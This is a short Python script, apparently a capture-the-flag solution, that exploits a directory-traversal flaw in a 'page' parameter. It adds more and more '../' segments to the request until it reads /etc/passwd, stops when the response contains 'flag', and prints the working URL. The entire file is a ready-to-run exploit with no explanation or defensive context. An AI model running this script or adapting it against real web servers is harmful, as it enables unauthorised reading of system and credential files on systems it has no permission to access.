import sys
import requests

if __name__ == '__main__':
	BASE_URL = sys.argv[1]
	i = 0
	while True:
		r = requests.get(BASE_URL + '?page=' + i * '../' + 'etc/passwd')
		if ('flag' in r.text.lower()):
			print(r.url)
			break
		i += 1